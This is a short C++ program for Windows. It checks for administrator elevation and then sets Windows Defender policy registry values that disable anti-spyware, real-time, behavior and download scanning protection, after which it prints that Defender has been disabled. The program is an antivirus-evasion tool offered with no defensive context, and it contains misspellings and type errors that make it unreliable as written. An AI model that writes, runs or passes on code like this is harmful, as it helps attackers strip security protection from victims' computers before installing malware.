#include <iostream>
#include <Windows.h>


using namespace std;

HANDLE AccessToken;

DWORD disable = 1;
DWORD enable = 0;

bool checker(void){
		bool isElavated = 0;
		
		bool opt = OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &AccessToken);
		if(opt == 0){
				cout << "Error: " << GetLastError() << '\n';
				return EXIT_FAILURE;
		}
		
		TOKEN_ELAVATION elav;
		PDWORD bs;
		
		
		size_t SizeOfElav = sizeof(elav);
		
		bool gti = GetTokenInformation(AccessToken, TokenElevation, &elav, SizeOfElav, &bs);
		
		if(opt){
				if(gti){
						isElavated = elav.TokenIsElevated;
				}
		}
		
		if(AccessToken){
				CloseHandle(AccessToken);
		}
		
		return isElavated;
}

int main(void){
		if(checker()){
				HKEY addkey;
				HKEY addnkey;
				
				
				LONG rok = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender", 0, KEY_ALL_ACCESS, &addkey);
				if(rok == ERROR_SUCCESS){
						RegSetValueEx(addkey, "DisableAntiSpyware", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
						
						RegSetValueEx(addkey, "DisableRealtimeMonitoring", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
						
						//RegSetValueEx(addkey, "DisableOnAccessProtection", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
						
						RegSetValueEx(addkey, "DisableBehaviorMonitoring", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
						
						RegSetValueEx(addkey, "DisableIOAVProtection", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
						
						RegSetValueEx(addkey, "DisableAccessOnProtection", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
						
						RegSetValueEx(addkey, "DisableScanOnRealtimeEnable", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
						
						RegCreateKeyEx(addkey, "Real-Time Protection", 0, 0, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, 0, &addnkey, 0);
						
						
						RegCloseKey(addkey);
						
						RegCloseKey(addnkey);
						
						cout << "WinDefender Disabled." << '\n' << "You Should Restart To Apply Registry Changes." << endl;
				}
				
				return 0;
		}
}
